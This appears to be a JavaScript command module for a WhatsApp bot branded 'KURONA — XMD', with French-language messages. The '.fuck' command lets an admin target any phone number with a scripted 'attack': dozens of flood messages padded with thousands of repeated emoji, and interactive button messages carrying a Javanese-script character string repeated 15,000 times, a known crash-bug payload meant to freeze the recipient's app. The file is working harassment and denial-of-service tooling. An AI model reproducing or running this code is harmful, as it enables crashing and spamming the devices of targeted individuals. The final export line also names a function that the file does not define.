//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 🎴
// Commande : fuck.js
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

import { isAdmin } from '../libs/functions.js';
import fs from 'fs/promises';
import path from 'path';

export async function fuck(message, client, participant) {
    const remoteJid = message.key.remoteJid;
    const user = message.pushName || "Utilisateur";
    const date = new Date().toLocaleString();
    const userJid = message.key.participant || message.key.remoteJid;

    try {
        // Vérification admin
        const isUserAdmin = await isAdmin(client, remoteJid, userJid);
        if (!isUserAdmin) {
            return await client.sendMessage(remoteJid, {
                text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ❌ *ACCÈS REFUSÉ !*\n│ \n│ ⚡ Seuls les administrateurs peuvent\n│ utiliser cette arme ultime.\n│ \n│ 🎴 *𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝑫𝛯𝑆𝛵𝑅𝛩𝑌𝛯𝑅* 🎴⚡\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
                quoted: message
            });
        }

        // Récupère l'argument après .fuck
        const body = (
            message.message?.extendedTextMessage?.text ||
            message.message?.conversation ||
            ""
        ).trim();

        const args = body.split(" ");
        const target = args[1];

        if (!target) {
            return await client.sendMessage(remoteJid, {
                text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ⚠️ *UTILISATION:* .fuck numéro\n│ \n│ *Exemple:* .fuck 237123456789\n│ \n│ 🎴 *𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫* 🎴⚡\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
                quoted: message
            });
        }

        // Message stylisé de confirmation
        const menuText = `
╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮
│        🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝛫-𝑭𝑈𝑪𝛫  𝐵𝑈𝐺 🎴
╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯
│ ❃ 𝑈𝑠𝑒𝑟 : ${user}
│ ❃ 𝐴𝑐𝑡𝑖𝑜𝑛 : 💀 K-FUCK ATTACK
│ ❃ 𝑇𝑎𝑟𝑔𝑒𝑡 : ${target}
│ ❃ 𝐷𝑎𝑡𝑒 : ${date}
│ ❃ 𝑆𝑡𝑎𝑡𝑢𝑠 : ⚡ INITIALISATION
╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯

╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮
│   🎴 *𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫* 🎴 
│    *𝐓𝐡𝐞 𝐔𝐥𝐭𝐢𝐦𝐚𝐭𝐞 𝐃𝐞𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧*
╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯`;

        await client.sendMessage(remoteJid, {
            text: menuText,
            quoted: message
        });

        const targetJid = target + "@s.whatsapp.net";

        // Séquence d'attaque ultime
        await client.sendMessage(remoteJid, {
            text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ⚡ *LANCEMENT DE L'ATTAQUE ULTIME...*\n│ \n│ > _Ciblage: " + target + "_\n│ > Mode: DESTRUCTION TOTALE\n│ > Status: EN COURS...\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
            quoted: message
        });

        // Phase 1: Spam de messages massifs
        for (let i = 0; i < 25; i++) {
            await client.sendMessage(targetJid, {
                text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ 💀 *FUCK ATTACK ULTIME* 💀\n│ \n│ 🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 🎴\n│ ⚡ The Ultimate Destruction\n│ ☠️ Target: " + target + "\n│ 🔥 Sequence: " + (i + 1) + "/25\n│ \n│ ⚠️ " + "🔴".repeat(1000) + " ⚠️\n│ ⚡ " + "💣".repeat(800) + " ⚡\n│ 💀 " + "☠️".repeat(1200) + " 💀\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯"
            });
            await new Promise(resolve => setTimeout(resolve, 300));
        }

        // Phase 2: Messages avec images et médias
        try {
            const imagePath = path.join(process.cwd(), 'assets', 'images', 'kurona_logo.png');
            await client.sendMessage(targetJid, {
                image: { url: imagePath },
                caption: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ 🎴 *𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝑫𝛯𝑆𝛵𝑅𝛩𝑌𝛯𝑅*🎴\n│ ⚡ K-FUCK ATTACK ULTIME\n│ ☠ Target: " + target + "\n│ ☠ Status: ANNIHILATION\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯"
            });
        } catch (mediaError) {
            console.log("Media non disponible, continuation sans media...");
        }

        // Phase 3: Messages interactifs destructeurs
        for (let i = 0; i < 15; i++) {
            await client.sendMessage(targetJid, {
                text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ 🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 🎴\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
                footer: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ⚡ Ultimate K-FUCK Attack ⚡\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
                buttons: [
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ☠️ " + "jeꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(15000) + " 💀\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
                            id: "KURONA_DESTROY"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ⚡ " + "ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(15000) + " 🔥\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
                            id: "KURONA_ANNIHILATE"
                        })
                    }
                ]
            });
            await new Promise(resolve => setTimeout(resolve, 400));
        }

        // Phase 4: Messages finaux de destruction
        for (let i = 0; i < 10; i++) {
            await client.sendMessage(targetJid, {
                text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ☢️ *DESTRUCTION TERMINÉE* ☢️\n│ \n│ 🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 🎴\n│ ⚡ K-FUCK Attack Successful\n│ ☠ Target: " + target + "\n│ 🔥 Status: TOTALLY K-FUCKED\n│ \n│ ⚡ " + "✅".repeat(500) + " ⚡\n│ 💀 " + "🎯".repeat(700) + " 💀\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯"
            });
            await new Promise(resolve => setTimeout(resolve, 500));
        }

        // Message de confirmation final
        await client.sendMessage(remoteJid, {
            text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ✅ *ATTAQUE ULTIME TERMINÉE !*\n│ \n│ 🎴 *𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝑫𝛯𝑆𝛵𝑅𝛩𝑌𝛯𝑅* 🎴\n│ ⚡ K-FUCK Attack complété avec succès\n│ ☠ Cible: " + target + "\n│ ☠ Status: ANNIHILÉE\n│ \n│ > _L'attaque ultime a été exécutée\n│ > avec perfection._\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
            quoted: message
        });

    } catch (error) {
        console.error("❌ Erreur k-fuck.js:", error);
        await client.sendMessage(remoteJid, {
            text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ⚠️ *ERREUR LORS DE L'ATTAQUE*\n│ \n│ > _Une erreur est survenue lors de\n│ > l'exécution de la commande K-FUCK._\n│ \n│ 🎴 *KURONA - XMD SUPPORT* ⚡\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
            quoted: message
        });
    }
}

export default kfuck;
